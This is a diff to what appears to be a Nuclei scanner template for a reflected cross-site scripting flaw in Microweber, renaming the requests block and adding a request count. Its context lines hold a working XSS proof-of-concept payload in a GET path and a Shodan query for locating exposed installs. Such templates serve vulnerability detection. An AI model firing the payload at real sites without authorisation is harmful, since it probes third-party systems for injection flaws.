@@ -13,10 +13,11 @@ info:
     cvss-score: 7.2
     cwe-id: CWE-79
   metadata:
+    max-request: 1
     shodan-query: http.favicon.hash:780351152
   tags: microweber,xss,oss
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/editor_tools/module?type=files/admin"><script>alert(document.domain)</script>&params=filetype=images#path='
